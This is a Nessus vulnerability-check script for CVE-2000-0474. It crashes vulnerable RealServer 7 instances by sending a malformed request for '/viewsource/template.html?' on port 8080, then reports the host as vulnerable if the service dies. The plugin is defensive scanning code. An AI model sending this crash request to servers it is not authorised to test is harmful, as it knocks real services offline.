#
# This script was written by John Lampe (j_lampe@bellsouth.net)
#
# See the Nessus Scripts License for details
#

include("compat.inc");

if(description)
{
  script_id(10461);
  script_version ("$Revision: 1.16 $");
  script_cve_id("CVE-2000-0474");
  script_bugtraq_id(1288);
  script_xref(name:"OSVDB", value:"360");

  script_name(english:"RealServer Malformed viewsource Directory Request DoS");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote media service has a denial of service vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of RealServer running on the remote host has a denial of
service vulnerability.  It was possible to crash the remote host by
sending a malformed HTTP request for a page in the viewsource
directory."
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to the latest version of RealServer."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
  );
  script_end_attributes();

  script_summary(english:"Test for DoS in RealServer 7");
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");
  script_copyright(english:"By John Lampe....j_lampe@bellsouth.net");
  script_dependencies("find_service1.nasl");
  script_require_ports("Services/realserver", 7070, 8080);   #port 7070, which may be indicative of server on 8080
  exit(0);
}



#
# The script code starts here
include("http_func.inc");
include("global_settings.inc");
if ( report_paranoia < 2 ) exit(0);

port = 8080;
if(get_port_state(port)) 
{
    if(http_is_dead(port:port))exit(0);
    
    mysoc = http_open_socket(port);
    if (mysoc) { 
      mystring = http_get(item:"/viewsource/template.html?",
      			  port:port);
      send(socket:mysoc, data:mystring);
    }
    else exit(0);
    http_close_socket(mysoc);
    if(http_is_dead(port:port))security_hole(port);
}
